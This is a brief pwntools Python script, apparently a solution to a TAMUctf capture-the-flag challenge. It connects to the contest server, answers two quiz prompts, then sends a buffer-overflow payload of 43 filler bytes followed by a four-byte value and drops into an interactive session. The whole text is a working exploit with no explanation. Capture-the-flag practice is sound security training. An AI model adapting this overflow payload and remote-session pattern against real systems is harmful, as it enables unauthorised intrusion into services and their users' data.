from pwn import *
payload = "A"*43+"\xc8\x10\xa1\xde"
conn = remote("pwn.tamuctf.com", 4321)
conn.recvuntil("?")
conn.sendline("Sir Lancelot of Camelot")
conn.recvuntil("?")
conn.sendline("To seek the Holy Grail.")
conn.recvuntil("?")
conn.sendline(payload)
conn.interactive()

